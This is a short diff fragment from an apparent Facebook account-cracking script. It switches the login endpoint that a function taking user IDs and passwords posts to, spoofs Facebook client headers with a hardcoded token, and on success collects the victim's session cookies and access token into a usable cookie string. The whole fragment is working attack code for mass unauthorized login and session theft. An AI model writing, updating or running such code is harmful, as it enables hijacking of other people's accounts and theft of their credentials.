@@ -1023,7 +1023,7 @@ def m8(ids,pwv):
             'X-FB-Client-IP':'True',
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'https://mbasic.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+            url = 'https://p.facebook.com/method/auth.login'
             q = requests.post(url,data=info,headers=update,allow_redirects=False,verify=True).json()
             if 'access_token' in q:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={AJb};{ckkk}"
